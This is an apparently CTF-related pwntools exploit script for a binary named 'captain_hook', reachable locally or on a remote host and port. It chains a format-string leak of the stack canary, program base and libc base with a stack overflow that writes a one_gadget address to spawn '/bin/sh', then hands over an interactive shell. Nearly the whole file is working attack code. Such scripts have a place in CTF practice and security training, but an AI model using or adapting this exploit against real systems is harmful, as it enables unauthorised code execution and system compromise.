#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './captain_hook'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000001423 # pop rdi ; ret

# elf, libc

# rop1
offset = 0
payload = 'A'*offset
payload += ''

def add(index):
    sla('peterpan@pwnuser:~$ ','2')
    sla(' [ Character index ]: ',str(index))
    sla('  Name: ','TaQini')
    sla('  Age: ','18')
    sla('  Date (mm/dd/yyyy): ','02/02/2020')

def edit(index,fmt):
    sla('peterpan@pwnuser:~$ ','4')
    sla(' [ Character index ]: ',str(index))
    sla('  Name: ','TaQiniAAAA'+fmt)
    sla('  Age: ','20')
    sla('  Date (mm/dd/yyyy): ','02/04/2020')

def read_info(index):
    sla('peterpan@pwnuser:~$ ','3')
    sla(' [ Character index ]: ',str(index))

# ru('')
# sl(payload)
add(0)
edit(0,'%17$p.%18$p.%19$p')
read_info(0)
ru('He\'s been locked up on 02/04/2020')
canary = eval(ru('.'))
text = eval(ru('.'))
libcbase = eval(ru('.'))-0x21b97
info_addr('canary',canary)
info_addr('text',text)
info_addr('libc',libcbase)

debug('b *$rebase(0x1170)')
og = 0x4f322 + libcbase 
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
edit(0,'A'*30+p64(canary)+p64(0)+p64(og)+p64(0)*8)

p.interactive()

